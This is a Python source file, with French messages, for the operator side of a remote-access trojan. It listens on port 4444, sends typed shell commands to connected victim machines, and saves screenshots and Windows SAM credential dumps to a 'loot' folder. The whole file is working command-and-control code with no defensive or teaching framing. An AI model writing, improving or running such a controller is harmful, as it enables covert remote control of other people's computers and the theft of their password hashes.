import socket
import os
import sys
import threading

HOST = "0.0.0.0"
PORT = 4444

def gerer_client(conn, addr):
    print(f"[+] Nouvelle connexion depuis {addr}")
    
    try:
        
        conn.settimeout(2.0)
        try:
            info_client = conn.recv(1024).decode('utf-8')
            print(f"[*] Info client : {info_client}")
        except socket.timeout:
            print("[!] Pas de message d'accueil recu.")
        finally:
            conn.settimeout(None)

        while True:
            cmd = input(f"Shell@{addr[0]} > ")
            
            if cmd.lower() in ['exit', 'quit']:
                conn.send(b"exit")
                break
                
            conn.send(cmd.encode("utf-8"))
            
            
            if cmd in ["screenshot", "sam"]:
                data = conn.recv(1024 * 1024) # 1 Mo max
                
                if data:
                    if cmd == "screenshot":
                        nom_fichier = f"loot/screen_{addr[0]}.png"
                    else:
                        nom_fichier = f"loot/sam_{addr[0]}.txt" 
                        
                    with open(nom_fichier, "wb") as f:
                        f.write(data)
                    print(f"[+] Fichier sauvegarde dans {nom_fichier}")
                else:
                    print("[-] Erreur : aucune donnee recue.")
            else:
                reponse = conn.recv(4096).decode("utf-8")
                if not reponse:
                    print("[-] Le client a ferme la connexion.")
                    break
                print(reponse)
                
    except Exception as e:
        print(f"[-] Erreur avec le client : {e}")
    finally:
        conn.close()
        print(f"[-] Deconnexion de {addr}")

def main():
    
    os.makedirs("loot", exist_ok=True)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[*] Serveur en ecoute sur le port {PORT}...")
    except Exception as e:
        print(f"[-] Impossible de demarrer : {e}")
        sys.exit(1)

    while True:
        conn, addr = server.accept()
        
        if os.name == 'nt':
            thread = threading.Thread(target=gerer_client, args=(conn, addr))
            thread.daemon = True
            thread.start()
            print(f"[*] Thread cree pour le client {addr}")
        else:
            pid = os.fork()
            if pid == 0:
                server.close()
                gerer_client(conn, addr)
                sys.exit(0)
            else:
                conn.close()
                print(f"[*] Processus fils cree (PID: {pid}) pour le client {addr}")

if __name__ == "__main__":
    main()